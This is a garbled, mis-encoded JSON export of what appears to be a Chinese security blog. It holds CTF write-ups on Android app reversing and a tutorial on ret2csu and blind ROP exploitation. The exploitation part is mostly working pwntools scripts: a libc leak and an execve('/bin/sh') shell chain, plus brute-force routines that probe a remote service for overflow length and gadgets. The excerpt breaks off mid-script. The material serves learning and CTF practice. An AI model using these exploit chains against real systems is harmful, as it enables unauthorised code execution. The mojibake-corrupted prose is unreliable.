åŸºäºå¯„å­˜å™¨æ¶æ„ï¼ˆâ‰¤Android 5.0ï¼‰ ARTè™šæ‹Ÿæœº DEXå­—èŠ‚ç ï¼ˆ.oatï¼‰ aotç¼–è¯‘æœºåˆ¶ åŸºäºå¯„å­˜å™¨æ¶æ„ï¼ˆ&gt;Android 5.0ï¼‰ Androidå››å¤§ç»„ä»¶å››å¤§ç»„ä»¶ Name What for æ´»åŠ¨(Activity) è¡¨ç°åŠŸèƒ½ï¼Œå¯è§†åŒ–çš„æŒ‡ä»¤æ“ä½œçª—å£ æœåŠ¡(Services) é•¿æœŸåå°æ‰§è¡Œï¼Œæ— äº¤äº’ å¹¿æ’­æ¥æ”¶è€…(Broadcast Recive) æ¥æ”¶å…¶ä»–åº”ç”¨ç¨‹åºçš„å¹¿æ’­ä¿¡æ¯ å†…å®¹æä¾›è€…(Content Provider) æ•°æ®é›†ï¼Œç”±å¤šä¸ªåº”ç”¨ç¨‹åºå…±äº«ä½¿ç”¨ Activityç”Ÿå‘½å‘¨æœŸ","categories":[],"tags":[{"name":"AndroidRe","slug":"AndroidRe","permalink":"http://example.com/tags/AndroidRe/"},{"name":"Summary","slug":"Summary","permalink":"http://example.com/tags/Summary/"}]},{"title":"Android Re","slug":"Android_Re","date":"2020-10-30T12:14:08.000Z","updated":"2021-03-24T09:49:58.007Z","comments":true,"path":"2020/10/30/Android_Re/","link":"","permalink":"http://example.com/2020/10/30/Android_Re/","excerpt":"â€‹ å®‰å“é€†å‘å…¥é—¨å…¥é—¨ã€‚","text":"â€‹ å®‰å“é€†å‘å…¥é—¨å…¥é—¨ã€‚æœ€è¿‘å¯ç®—å¼€å§‹å­¦å®‰å“é€†å‘äº†ï¼Œå…ˆåˆ·åˆ·jarvis ojä¸Šçš„é¢˜åº·åº·ã€‚ 0x00 . Smailâ€‹ é¢˜ç›®åªç»™äº†ä¸€ä¸ª.smailæ–‡ä»¶ã€‚smailæ˜¯Davlikè™šæ‹Ÿæœºçš„å¯„å­˜å™¨è¯­è¨€ï¼Œç›¸å½“äºpcå¹³å°çš„æ±‡ç¼–è¯­è¨€ï¼Œå¯ä»¥çœ‹å‡ºä¸ªå¤§æ¦‚é€»è¾‘ã€‚ â€‹ ä¸è¿‡å½“ç„¶å¯ä»¥å€ŸåŠ©Smail2javaå·¥å…·ï¼Œå°†å…¶è½¬æ¢æˆ.javaæ–‡ä»¶ã€‚ â€‹ javaå¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445package net.bluelotus.tomorrow.easyandroid;import android.util.Base64;import java.io.PrintStream;import java.security.NoSuchAlgorithmException;import javax.crypto.NoSuchPaddingException;import java.security.InvalidKeyException;import javax.crypto.IllegalBlockSizeException;import javax.crypto.BadPaddingException;import javax.crypto.spec.SecretKeySpec;import javax.crypto.Cipher;import java.security.Key;import java.security.GeneralSecurityException;public class Crackme &#123; private String str2 = &quot;cGhyYWNrICBjdGYgMjAxNg==&quot;; public Crackme() &#123; GetFlag(&quot;sSNnx1UKbYrA1+MOrdtDTA==&quot;); &#125; private String GetFlag(String p1) &#123; byte[] &quot;content&quot; = Base64.decode(p1.getBytes(), 0x0); String &quot;kk&quot; = new String(Base64.decode(str2.getBytes(), 0x0)); System.out.println(decrypt(&quot;content&quot;, &quot;kk&quot;)); return null; &#125; private String decrypt(byte[] p1, String p2) &#123; String &quot;m&quot; = 0x0; try &#123; byte[] &quot;keyStr&quot; = p2.getBytes(); SecretKeySpec &quot;key&quot; = new SecretKeySpec(&quot;keyStr&quot;, &quot;AES&quot;); Cipher &quot;cipher&quot; = Cipher.getInstance(&quot;AES/ECB/NoPadding&quot;); &quot;cipher&quot;.init(0x2, &quot;key&quot;); byte[] &quot;result&quot; = &quot;cipher&quot;.doFinal(p1); return &quot;m&quot;; &#125; catch(NoSuchPaddingException &quot;e&quot;) &#123; &quot;e&quot;.printStackTrace(); &#125; return &quot;m&quot;; &#125;&#125; â€‹ ä¸€å¼€å§‹ä¸€ç›´åœ¨çº ç»“Cipher.getInstanceå•¥çš„çœ‹ä¸æ‡‚ï¼Œç„¶åæ‰“ç®—ä¸¢å»eclipseæˆ–è€…Android Studioç›´æ¥è·‘ä½†æ˜¯ç¢°åˆ°ä¸€å †ç¼–è¯‘é—®é¢˜ï¼Œååˆ†å¤´ç–¼ã€‚çœ‹äº†çœ‹è§£æï¼ŒåŸæ¥åªè¦æ˜ç™½æ˜¯AESåŠ å¯†å°±å¯ä»¥äº†ï¼ˆæœç„¶é€†å‘è¿˜æ˜¯å¾—ä¸“æ³¨å…³é”®ä»£ç ï¼‰ï¼Œäºæ˜¯ç”¨pythonè§£ç ï¼š 123456import base64from Crypto.Cipher import AEScode = base64.b64decode(&quot;sSNnx1UKbYrA1+MOrdtDTA==&quot;)key = base64.b64decode(&quot;cGhyYWNrICBjdGYgMjAxNg==&quot;)aes=AES.new(key,AES.MODE_ECB)print aes.decrypt(code) 0x01 . çˆ¬æ¥¼æ¢¯â€‹ å®‰è£…apkå¹¶æ‰“å¼€ï¼Œæ˜¯ä¸€ä¸ªçˆ¬æ¥¼å°æ¸¸æˆï¼Œç‚¹å‡»æŒ‰é’®çˆ¬æ¥¼ï¼Œçˆ¬åˆ°äº†å°±èƒ½çœ‹flagã€‚ â€‹ çœ‹åˆ°è¿™ç¬¬ä¸€æ—¶é—´æƒ³åˆ°äº†å…«é—¨ç¥å™¨ï¼Œç›´æ¥ç»™rootæƒé™ç„¶åä¿®æ”¹å·²çˆ¬æ¥¼å±‚å°±å®Œäº‹ã€‚ä½†æ˜¯è«åå…¶å¦™çš„æ˜¯å…«é—¨ç¥å™¨å¥½åƒä¸é€‚é…æ¨¡æ‹Ÿå™¨çš„å®‰å“ç‰ˆæœ¬ï¼ˆ7.1.2ï¼‰ï¼Œæ¨¡æ‹Ÿå™¨å·²ç»åˆ†é…äº†è¶…çº§ç”¨æˆ·æƒé™ï¼Œä½†æ˜¯æ‰“å¼€å…«é—¨ä¾æ—§æç¤ºæ²¡æœ‰rootæƒé™ã€‚ â€‹ äºæ˜¯åæ±‡ç¼–apkï¼Œç ”ç©¶ç ”ç©¶é€»è¾‘ã€‚ â€‹ ç¡®å®æ˜¯çˆ¬åˆ°æ¥¼å±‚å³å¯çœ‹flagï¼Œä¸è¿‡æ¥¼å±‚æ•°æ¯æ¬¡æ‰“å¼€éƒ½æ˜¯ä¸ªéšæœºæ•°ï¼Œè¯¥éšæœºæ•°è¦å¯¹32è¿›è¡Œå–ä½™ï¼Œå› æ­¤æœ‰ä¸€å®šæ¦‚ç‡åœ¨æ‰“å¼€åå‘ç°æ¥¼å±‚æ•°ä¸º0ï¼Œå¯ä»¥ç›´æ¥æ‹¿flagã€‚ â€‹ ä¸è¿‡è¿˜æ˜¯é‡‡ç”¨ä¸“ä¸šåŠæ³•ï¼Œç”¨mtç®¡ç†å™¨è§£å‹ï¼ŒDexç¼–è¾‘å™¨æŸ¥çœ‹dexæ–‡ä»¶ã€‚ â€‹ â€‹ æ¥ç€æ‰¾åˆ°MainActivity()ã€‚ â€‹ å‘ç°ç¬¬ä¸€è¡Œå¤„v5è¢«åˆå§‹åŒ–ä¸º0ï¼Œ8-9è¡Œå¤„ç”¨v5åˆå§‹åŒ–v0ï¼Œç„¶åå°†v0çš„å€¼ç”¨ä½œå‚æ•°è°ƒç”¨flagç»„ä»¶çš„ setClickable()å‡½æ•°ã€‚ä¹Ÿå°±æ˜¯è¯´å°†v5åˆå§‹åŒ–å€¼æ”¹ä¸º1å³å¯ä½¿å¾—flagç»„ä»¶ä¸€ç›´å¤„äºclickableã€‚ â€‹ æ”¹äº†ä¹‹ååœ¨å³ä¸Šè§’ç‚¹å‡»ä¿å­˜ï¼Œé€€å‡ºå†ä¿å­˜ä¸€æ¬¡ï¼Œç„¶åä¸€è·¯é€€å‡ºã€‚ â€‹ â€‹ ç„¶åå…¨é€‰(å·¦å³åˆ’åŠ¨é€‰æ‹©)ï¼Œé•¿æŒ‰å‹ç¼©ï¼Œé€‰æ‹©apkæ¨¡å¼ã€‚ â€‹ ç„¶åé•¿æŒ‰CFF.apkï¼ŒåŠŸèƒ½-apkç­¾åã€‚ â€‹ ç„¶åå®‰è£…ï¼Œæ‹¿åˆ°flagã€‚ 0x02 . FindPassâ€‹ æ¨¡æ‹Ÿå™¨å®‰è£…apkæ‰“å¼€ç…ç…ã€‚ â€‹ jebåç¼–è¯‘apkç…ç…ã€‚ â€‹ æ¯”è¾ƒè¾“å…¥çš„å­—ç¬¦ä¸²(v5)å’Œv4æ˜¯å¦ä¸€è‡´ï¼Œä¸€è‡´åˆ™å¾—åˆ°flagã€‚ â€‹ åœ¨è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œv4å¿…ç„¶ä¼šå­˜å‚¨åˆ°å†…å­˜ä¸­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åŠ¨è°ƒæŸ¥çœ‹ã€‚åœ¨æ¨¡æ‹Ÿå™¨æ–‡ä»¶å¤¹æ‰“å¼€ç»ˆç«¯ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œå¾—åˆ°æ¨¡æ‹Ÿå™¨ç«¯å£å·ã€‚ â€‹ ç„¶åå†ç”¨ç³»ç»Ÿçš„adbè¿æ¥ä¸Šç«¯å£ã€‚ â€‹ åœ¨æ¨¡æ‹Ÿå™¨æ‰“å¼€appï¼Œç„¶ååœ¨jebæ‰“å¼€è°ƒè¯•å™¨ï¼Œé€‰æ‹©å¼€å§‹è°ƒè¯•ï¼Œå°±å¯ä»¥æ‰¾åˆ°æ¨¡æ‹Ÿå™¨çš„è¿›ç¨‹ã€‚ â€‹ é™„ä¸Šä¹‹åå¼€å§‹è°ƒè¯•ã€‚ â€‹ å‘ç°æŠ¥é”™ï¼ŒåŸæ¥æ˜¯apkè®¾ç½®æˆäº†ä¸å¯è°ƒè¯•ã€‚ç”¨apktoolsåç¼–è¯‘å‡ºæ¥ï¼Œç„¶åä¿®æ”¹xmlï¼Œåœ¨applicationæ ‡ç­¾ä¸­åŠ ä¸Š**android:debuggable=â€trueâ€**å¹¶ç”¨ç©ºæ ¼éš”å¼€ã€‚ â€‹ é‡æ–°è°ƒè¯•ï¼Œåœ¨æ ‡ç­¾90å¤„ä¸‹æ–­ç‚¹ï¼Œå·²çŸ¥v9ä¸­å­˜çš„å°±æ˜¯v4çš„flagã€‚ â€‹ æŸ¥çœ‹å±€éƒ¨å˜é‡åˆ—è¡¨ï¼Œå³å¯å‘ç°flagã€‚","categories":[],"tags":[{"name":"AndroidRe","slug":"AndroidRe","permalink":"http://example.com/tags/AndroidRe/"}]},{"title":"Intermediate ROP","slug":"Intermediate_ROP","date":"2020-08-19T14:19:07.000Z","updated":"2021-03-24T09:46:39.337Z","comments":true,"path":"2020/08/19/Intermediate_ROP/","link":"","permalink":"http://example.com/2020/08/19/Intermediate_ROP/","excerpt":"â€‹ Ret2csu &amp; BROP","text":"â€‹ Ret2csu &amp; BROP 0x00 . ret2csuA . åŸç†â€‹ è¿™ä¸ªæŠ€æœ¯ç®—æ˜¯ä¸€ä¸ªé€šç”¨çš„ropæŠ€æœ¯ï¼Œç”¨åˆ°äº†__libc_csu_init()è¿™ä¸ªå‡½æ•°ï¼Œåªè¦ç¨‹åºè°ƒç”¨äº†åº“å‡½æ•°å°±ä¸€å®šéœ€è¦è°ƒç”¨è¿™ä¸ªå‡½æ•°å¯¹åº“è¿›è¡Œåˆå§‹åŒ–ã€‚ â€‹ å†™ä¸€ä¸ªç®€å•demoï¼š 1234567891011121314//level5.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vulnerable_function() &#123; char buf[128]; read(STDIN_FILENO, buf, 512);&#125;int main(int argc, char** argv) &#123; write(STDOUT_FILENO, &quot;Hello, World\\n&quot;, 13); vulnerable_function();&#125; â€‹ å…³é—­canaryï¼Œå…³é—­pieè¿›è¡Œ64ä½ç¼–è¯‘ã€‚ç„¶ååˆ©ç”¨objdumpå‘½ä»¤ï¼Œå¯ä»¥çœ‹åˆ°å„ä¸ªæ®µåæ±‡ç¼–çš„æƒ…å†µï¼š 12gcc -fno-stack-protector -no-pie level5.c -o level5objdump -d level5 â€‹ ä»”ç»†è§‚å¯Ÿè¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ä¸€ä¸‹æœ‰ç”¨çš„gadgetï¼š â€‹ å¦‚æœæˆ‘ä»¬èƒ½æ„é€ ropé“¾ï¼Œä½¿å¾—ç³»ç»Ÿå…ˆæ‰§è¡Œ1ï¼Œå†æ‰§è¡Œ2ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ§åˆ¶rdiï¼Œrsiï¼Œrdxä¸‰ä¸ªå¯„å­˜å™¨ã€‚åœ¨1å¤„ï¼Œæˆ‘ä»¬å‘ç°äº†6ä¸ªå¼¹æ ˆæ“ä½œï¼Œç³»ç»Ÿå°†æ ˆä¸Šæ•°æ®å‚¨å­˜åˆ°å¯„å­˜å™¨ä¸­ï¼Œè€Œååœ¨2å¤„æˆ‘ä»¬åˆé€šè¿‡è¿™äº›å¯„å­˜å™¨ç»™rdiï¼Œrsiï¼Œrdxè¿›è¡Œäº†èµ‹å€¼ã€‚ â€‹ å› ä¸ºåæ±‡ç¼–çš„åå·®ï¼Œåœ¨idaä¸­çœ‹0x4005D9ï¼Œå‘ç°ç³»ç»Ÿéšåè°ƒç”¨äº†rbx*8+r12è¿™ä¸ªåœ°å€ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶è¿™ä¸¤ä¸ªå¯„å­˜å™¨æ¥æ§åˆ¶è°ƒç”¨åœ°å€ï¼Œè¿›è€Œå®ç°æ”»å‡»æˆ–è€…æ•°æ®æ³„éœ²ã€‚ â€‹ å®Œæ•´æµç¨‹å¦‚ä¸‹ï¼š ç¨‹åºé€šè¿‡æº¢å‡ºè·³è½¬åˆ°1å¼€å§‹æ‰§è¡Œã€‚ ç¨‹åºæ‰§è¡Œåˆ°0x4005F4å¤„çš„retï¼Œè¿”å›åˆ°æˆ‘ä»¬é€šè¿‡æº¢å‡ºè€Œé¢„è®¾çš„è¿”å›åœ°å€ï¼Œå³2å¤„ã€‚ ç¨‹åºä»2å¤„ä¸€ç›´å¾€ä¸‹æ‰§è¡Œï¼Œ0x4005D9å¤„è°ƒç”¨å®Œå‡½æ•°åè¿”å›åˆ°0x4005DDç»§ç»­æ‰§è¡Œã€‚ æ‰§è¡Œ0x4005DDï¼Œä½¿å¾—rbxå¯„å­˜å™¨+1ï¼Œæ¥ç€æ¯”è¾ƒrbxï¼Œrbpï¼Œå¦‚æœç›¸ç­‰åˆ™ä¸è·³è½¬ï¼Œæ¥ç€å¾€ä¸‹æ‰§è¡Œã€‚å› æ­¤è¿™é‡Œæˆ‘ä»¬éœ€è¦é¢„è®¾å¯„å­˜å™¨çš„å€¼ä½¿å¾—rbxï¼Œrbpæ»¡è¶³ä¸è·³è½¬çš„æ¡ä»¶ã€‚ä¹Ÿå°±æ˜¯è¦è®©rbx+1 == rbpã€‚ å†æ¬¡æ‰§è¡Œåˆ°0x4005F4å¤„çš„retï¼Œropé“¾ç»“æŸã€‚ â€‹ å½“ç„¶ï¼Œè¯¥æŠ€æœ¯ä¹Ÿæœ‰ä¸€äº›éœ€è¦æ³¨æ„çš„ç‚¹ï¼š 0x4005D6ä¸­çš„èµ‹å€¼åªæ˜¯å¯¹edièµ‹å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´ä»…æ”¹å˜äº†rdiå¯„å­˜å™¨çš„ä½32ä½ï¼Œå¦‚æœrdiæœ¬èº«æ•°å€¼è¿‡å¤§ï¼Œåˆ™éœ€è¦å¦å¤–æ‰¾gadgetã€‚ ä¸ºäº†è®©rbx+1 == rbpï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•åœ°è®¾ç½®è®©rbx = 0ï¼Œrbp = 1ã€‚ å› ä¸ºéœ€è¦ä¸¤æ¬¡ç»è¿‡1å¤„ï¼Œæ‰€ä»¥åä¸€æ¬¡ç»è¿‡çš„æ—¶å€™ä¹Ÿéœ€è¦è®¾ç½®6ä¸ªå¯„å­˜å™¨çš„å€¼(åƒåœ¾å€¼å³å¯)ï¼Œç„¶åå†åŠ ä¸Šæœ€åçš„è¿”å›åœ°å€ï¼Œæ¥é¿å…ç¨‹åºå´©æºƒã€‚ B . ç¤ºä¾‹â€‹ ç”¨level5è§£é¢˜è¿›è¡Œæ¼”ç¤ºã€‚ â€‹ æ—¢ç„¶æœ‰gadgetäº†ï¼Œé‚£ä¹ˆæ€è·¯å°±æ¯”è¾ƒæ¸…æ™°äº†ï¼š é€šè¿‡ret2csuè®¾ç½®rbxä¸º0ï¼Œrbpä¸º1ï¼Œr12ä¸ºéœ€è¦æ‰§è¡Œçš„å‡½æ•°åœ°å€ï¼Œr13ï¼Œr14ï¼Œr15ï¼Œåˆ†åˆ«ä¸ºr12å‡½æ•°çš„å‚æ•°ï¼Œretè®¾ç½®è¿”å›åœ°å€ï¼Œæ¯”å¦‚mainã€‚ ç¬¬ä¸€æ¬¡ret2csuï¼Œå°†write_gotå†™å…¥ropé“¾ï¼Œæ³„éœ²å‡ºwriteçš„çœŸå®åœ°å€ï¼Œå†è®¡ç®—libcå’Œå…¶ä»–æ‰€éœ€åœ°å€ã€‚ ç¬¬äºŒæ¬¡ret2csuï¼Œå°†read_gotå†™å…¥ropé“¾ï¼Œå°†systemåœ°å€å’Œâ€/bin/shâ€å­—ç¬¦ä¸²å†™å…¥åˆ°bssæ®µã€‚ ç¬¬ä¸‰æ¬¡ret2csuï¼Œå°†bss_addrå†™å…¥ropé“¾ï¼Œå‚æ•°ä¸ºbss_addr + 8ï¼Œåˆ™æ‰§è¡Œexecve(â€œ/bin/shâ€,0,0); â€‹ å½“ç„¶ï¼Œæœ€åä¸€æ¬¡ret2csuï¼Œç”¨systemå‡½æ•°ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ä¸è¿‡æˆ‘è²Œä¼¼æ²¡æˆåŠŸã€‚è€Œä¸”ç†è®ºä¸Šç›´æ¥è°ƒç”¨execveåœ°å€å°±å®Œäº†ï¼Œæ²¡å¿…è¦å†™åœ¨bssä¸Šï¼Œä½†æ˜¯å®é™…æ“ä½œä¸Šå´è¡Œä¸æ‡‚ã€‚æš‚æ—¶å­˜ç–‘ã€‚ Exploit 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *context.log_level = &#x27;debug&#x27;p = process(&quot;./level5&quot;)elf = ELF(&quot;./level5&quot;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) #&quot;ldd level5&quot; to figuer out the libc versionread_got = elf.got[&#x27;read&#x27;]write_got = elf.got[&#x27;write&#x27;]bss_addr = 0x601038main_addr = 0x400558write_offset = libc.symbols[&#x27;write&#x27;]execve_offset = libc.symbols[&#x27;execve&#x27;]print execve_offsetdef csu(rbx,rbp,r12,r13,r14,r15,ret): payload = 136*&#x27;A&#x27; payload += p64(0x4005e6)# gadget1 modify r13,r14,r15 payload += p64(0) # padding payload += p64(rbx) # rbx payload += p64(rbp) # rbp payload += p64(r12) # call addr payload += p64(r13) # rdi payload += p64(r14) # rsi payload += p64(r15) # rdx payload += p64(0x4005d0) # gadget2 modify rdi,rsi,rdx payload += &#x27;A&#x27;*0x38 # padding again for register payload += p64(ret) # ret p.sendline(payload) p.recvuntil(&quot;Hello, World&quot;)csu(0,1,write_got,1,write_got,8,main_addr)temp = p.recv(8)#write_addr = u64(temp.ljust(8,&#x27;\\x00&#x27;))write_addr = 0x7ffff7af4140print &quot;here is write_addr:&quot; +hex(write_addr)libc_addr = write_addr - write_offsetexecve_addr = libc_addr + execve_offsetprint &quot;Now we know the execve_addr:&quot;,print execve_addrbin_addr = libc_addr + next(libc.search(&#x27;/bin/sh&#x27;))p.recvuntil(&quot;Hello, World&quot;)csu(0,1,read_got,0,bss_addr,16,main_addr)p.send(p64(execve_addr) + &quot;/bin/sh\\x00&quot;)#gdb.attach(p) #To see if you write the data successfullyp.recvuntil(&quot;Hello, World&quot;)csu(0,1,bss_addr,bss_addr+8,0,0,execve_addr)p.interactive() C . å°æŠ€å·§â€‹ æˆ‘ä»¬ç›´æ¥çœ‹__libc_csu_init()å‘ç°0x4005eaåˆ°0x4005f3å¹¶ä¸æ˜¯æ¯ä¸ªå­—èŠ‚å„è¡¨ç¤ºä¸€æ¡æ±‡ç¼–è¯­å¥ï¼Œæœ‰å‡ å¥å äº†ä¸¤ä¸ªå­—èŠ‚ã€‚ â€‹ ç„¶è€Œç›´æ¥çœ‹0x4005edçš„è¯ï¼Œæˆ‘ä»¬ä¼šå‘ç°æ­¤å¤„çš„æ±‡ç¼–è¯­å¥æ˜¯pop rsp; â€‹ 0x4005efcå¤„æ˜¯pop rbp; â€‹ è¿˜æœ‰pop rsiå’Œpop rdiã€‚ â€‹ é€šè¿‡åç§»æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸å°‘gedgetã€‚ 0x01 . BROPA . åŸç†â€‹ è¿™ä¸ªæŠ€æœ¯æŒºğŸ‚ğŸºçš„ã€‚æ˜¯å‡ ä¸ªæ–¯å¦ç¦å¤§å­¦çš„å¸ˆå‚…åœ¨å…¬å…ƒ2014å¹´å‘è¡¨çš„è®ºæ–‡ä¸­æå‡ºçš„ä¸€é¡¹ROPæŠ€æœ¯ï¼Œä¹Ÿæœ‰é€šä¿—çš„pptã€‚ â€‹ BROPå°±æ˜¯blink ropï¼Œæ˜¯æŒ‡æ²¡æœ‰æºç¨‹åºæºä»£ç çš„æƒ…å†µä¸‹(ä¸€èˆ¬æ˜¯åªå…è®¸è¿œç¨‹è¿æ¥)è¿›è¡Œropå¹¶ä¸”getshellã€‚æ–¹æ³•å°±æ˜¯é€šè¿‡æœ‰é™æ•°æ®å¯¹ç¨‹åºç»“æ„è¿›è¡Œåˆç†çŒœæµ‹ä»¥åŠè¿›è¡Œé€‚å½“çš„çˆ†ç ´ã€‚ â€‹ é€‚ç”¨æ¡ä»¶å¦‚ä¸‹ï¼š å­˜åœ¨æ ˆæº¢å‡º è¿›ç¨‹å´©æºƒåè‡ªè¡Œé‡æ–°å¯åŠ¨ï¼Œå¹¶ä¸”é‡å¯åå„åœ°å€ä¸ä¹‹å‰è¿›ç¨‹åœ°å€ä¸€è‡´ã€‚ â€‹ æ”»å‡»æ­¥éª¤å¦‚ä¸‹ï¼š ç¡®å®šæº¢å‡ºé•¿åº¦ã€‚ å¯»æ‰¾å¯è¡Œè¿”å›åœ°å€ã€‚ å¯»æ‰¾gadgetã€‚ ç¡®å®špltè¡¨ã€‚ ç¡®å®šgotè¡¨ã€‚ æ³„éœ²éƒ¨åˆ†ç¨‹åºäºŒè¿›åˆ¶æ•°æ®ã€‚ ç¡®å®šlibcå¹¶è¿›è¡Œæ”»å‡»ã€‚ â€‹ ä»¥ä¸‹ç»“åˆ HCTF2016 çš„å‡ºé¢˜äººå¤±è¸ªäº†ä¸€é¢˜é€æ­¥è§£é‡Šï¼Œé€šè¿‡æœ¬åœ°dockerè¿›è¡Œè¿œç¨‹æ”»å‡»ã€‚ 1 . ç¡®å®šæº¢å‡ºé•¿åº¦â€‹ æˆ‘ä»¬éœ€è¦ç¡®å®šæº¢å‡ºç‚¹åˆ°è¿”å›åœ°å€çš„è·ç¦»ï¼Œé€šè¿‡çˆ†ç ´å¯ä»¥å®ç°ã€‚åœ¨ié€æ¸é€’å¢æ—¶ï¼Œå¦‚æœæŸä¸€ä¸ªiçš„å€¼ä½¿å¾—ç¨‹åºå‘ç”ŸEOFé”™è¯¯ï¼Œå°±è¯´æ˜æº¢å‡ºé•¿åº¦è¶…è¿‡äº†è¿”å›åœ°å€ï¼Œé‚£ä¹ˆi-1åˆ™å¯ä»¥è§†ä½œæº¢å‡ºé•¿åº¦ã€‚ 123456789101112131415161718def find_length(): i = 1 while 1: try: p = remote(&quot;127.0.0.1&quot;,10000) p.recvuntil(&quot;\\n&quot;) p.send(&#x27;a&#x27; * i) output = p.recv() print output p.close() if not output.startswith(&quot;No password&quot;): return i-1 else: i+=1 except EOFError: p.close() return i-1length = 72 2.å¯»æ‰¾å¯è¡Œè¿”å›åœ°å€â€‹ è¿™é‡Œè¯´çš„è¿”å›åœ°å€ï¼Œæ˜¯å¡«å……åœ¨ropé“¾æœ«ç«¯ä»¥ä¾¿æ§åˆ¶è¿”å›ç”¨çš„ã€‚å¤§æ¦‚æ˜¯ç±»ä¼¼main()å‡½æ•°ä¹‹ç±»çš„ä½ç½®ï¼Œç”¨æ¥æ§åˆ¶æµç¨‹ã€‚ â€‹ è¦å¯»æ‰¾å¯è¡Œè¿”å›åœ°å€(stop_addr)å¾ˆç®€å•ï¼Œåœ¨çŸ¥é“æº¢å‡ºé•¿åº¦çš„æƒ…å†µä¸‹ï¼Œåªè¦ä»0x400000å¼€å§‹çˆ†ç ´ï¼Œå¦‚æœæ‰¾åˆ°æŸä¸€ä¸ªaddrèƒ½æˆåŠŸè®©ç¨‹åºè¿”å›main()å‡½æ•°ï¼Œå°±è¯´æ˜è¿™ä¸ªåœ°å€å¯è¡Œã€‚ 123456789101112131415161718def fine_stop(): addr = 0x400556 while addr&lt;0xffffff: try: p = remote(&quot;127.0.0.1&quot;,10000) p.recvuntil(&quot;\\n&quot;) p.send(&#x27;a&#x27; * length + p64(addr)) p.recv() p.close() print &quot;===================&quot; print &quot;This addr might work : %x&quot;%addr print &quot;===================&quot; addr+=1 except Exception: print &quot;%x--Nah&quot;%addr addr+=1 p.close()stop_gadget = 0x4006b6 â€‹ è¿™æ ·æ‰¾å‡ºæ¥çš„åœ°å€å¯èƒ½æœ‰ä¸å°‘ï¼Œæˆ‘ä»¬æŒ‘ä¸€ä¸ªå°±è¡Œã€‚ â€‹ è¿™é‡Œæˆ‘ä»¬ä¸ºäº†æ–¹ä¾¿ï¼Œç›´æ¥è®©stop_addr = 0x4006B6ï¼Œä¹Ÿå°±æ˜¯main()å‡½æ•°çš„åœ°å€ã€‚ 3.å¯»æ‰¾gadgetâ€‹ åˆå«stack readingï¼Œæ—¨åœ¨å¯»æ‰¾å¯è¡Œçš„pop_retè¯­å¥ï¼Œå®Œæˆå¯¹äºå¯„å­˜å™¨çš„ä¿®æ”¹ã€‚ â€‹ æˆ‘ä»¬çŸ¥é“ï¼Œæ ˆä¸Šçš„æ•°æ®å¸ƒå±€æ­£å¸¸æ¥è¯´æ˜¯è¿™æ ·çš„ã€‚ 1padding|canary|parameters&#x2F;pop_ret|saved returned address â€‹ æ‰€ä»¥æ€»çš„æ¥è¯´ï¼Œèƒ½å¤Ÿä½¿ç¨‹åºé¡ºåˆ©æ‰§è¡Œçš„ropé“¾åŸºæœ¬ä¸Šæœ‰å¦‚ä¸‹2ç§ç»“æ„ï¼š 1payload = padding + return addr 1payload = padding + canary + pop_ret + arg1 + ... ... + argn + return addr â€‹ å¦‚æœæˆ‘ä»¬è¦æ‰¾pop_retè¯­å¥ï¼Œçˆ†ç ´ç¬¬äºŒä¸ªpayloadå³å¯ã€‚æ§åˆ¶argçš„æ•°é‡ä¸ºnä¸ªï¼Œå°±å¯ä»¥æ‰¾å‡ºpopå‡ºnä¸ªå¯„å­˜å™¨çš„è¯­å¥ã€‚è¯¥é¢˜ä¸­ï¼Œæˆ‘ä»¬æ‰¾ret2csuä¸­çš„ 1234567pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret; â€‹ åˆ™ä½¿ç”¨å¦‚ä¸‹payloadï¼š 1payload = padding + pop_ret + p64(0) * 6 + return addr â€‹ å¦‚æœçˆ†ç ´å¾—åˆ°äº†ä¸€ä¸ªpop_reté¡ºåˆ©ä½¿å¾—ç¨‹åºè¿”å›åˆ°äº†main()å°±è¯´æ˜å®ƒæœ‰å¯èƒ½æ˜¯æˆ‘ä»¬è¦æ‰¾çš„åœ°å€ã€‚ â€‹ æˆ‘ä»¬è¿˜éœ€è¦æµ‹è¯•ï¼Œå¦‚æœä¸æŒ‰å¥—è·¯ç»™äºˆå¯„å­˜å™¨è¶³å¤Ÿçš„å€¼ï¼Œç¨‹åºä¼šä¸ä¼šå´©æºƒï¼š 1payload = padding + pop_ret + p64(0) * 10 â€‹ å¦‚æœç¨‹åºå´©æºƒï¼Œé‚£ä¹ˆè¯´æ˜pop_retç¡®å®æ˜¯æˆ‘ä»¬è¦æ‰¾çš„åœ°å€ï¼Œå› ä¸ºä¸Šè¿°payloadä½¿å…¶è¿”å›åˆ°äº†åœ°å€0x0000ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041def fine_csu(): addr = 0x4007a0 while 1: try: print &quot;%x connecting...&quot;%addr p = remote(&quot;127.0.0.1&quot;,10000) p.recvuntil(&quot;\\n&quot;) payload = &#x27;a&#x27; * length #now try the rop_chain payload+=p64(addr) #ret of vuln_func(may be) payload+=p64(1) + p64(2) +p64(3) + p64(4) + p64(5) +p64(6) payload+=p64(stop_gadget) #ret of pop_ret p.send(payload) output = p.recv() p.close() if not output.startswith(&quot;WelCome&quot;): #which means we fault to return to the main() successfully print &quot;%x doesn&#x27;t working...&quot;%addr addr+=1 continue else: try: #Here we need to test the addr p = remote(&quot;127.0.0.1&quot;,10000) p.recvuntil(&quot;\\n&quot;) payload = &#x27;a&#x27; * length payload+=p64(addr) payload+=p64(0)*10 #the given addr 0x00000000 would be unreachable for the process p.send(payload) output = p.recv() p.close() print &quot;Fake addr : %x&quot;%addr #The addr couldn&#x27;t be the pop_ret we need if the process exit successfully continue except Exception: #If the program crashes,we can be sure that we got the right gadget addr print &quot;We found!!! The addr is : %x&quot;%addr return 1 except EOFError: print 